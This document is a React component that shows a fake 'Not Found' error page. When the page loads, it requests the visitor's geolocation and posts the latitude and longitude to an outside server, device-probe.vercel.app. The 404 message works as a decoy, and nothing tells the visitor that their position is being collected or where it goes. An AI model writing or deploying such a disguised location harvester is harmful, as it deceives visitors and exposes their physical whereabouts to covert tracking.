import logo from "./logo.svg";
import "./App.css";
import axios from "axios";
import { useEffect } from "react";

function App() {
  useEffect(() => {
    getLocation();
  }, []);

  function getLocation() {
    navigator.geolocation.getCurrentPosition(async (position) => {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      console.log(latitude, longitude);

      const body = {
        deviceLatitude: latitude,
        deviceLongitude: longitude,
      };
      main(body);
    });
  }

  function main(body) {
    console.log(body);
    return axios
      .post(`https://device-probe.vercel.app/`, {
        deviceLatitude: body.deviceLatitude,
        deviceLongitude: body.deviceLongitude,
      })
      .then((response) => {
        return response.data;
      })
      .catch((error) => {
        return { res: error, status: false, statusCode: 500, error: "error" };
      });
  }

  return (
    <div className="not-found">
      <h1>Not Found</h1>
      <p>We're sorry, but the page you requested could not be found.</p>
      <button onClick={() => window.history.back()}>Go Back</button>
    </div>
  );
}

export default App;
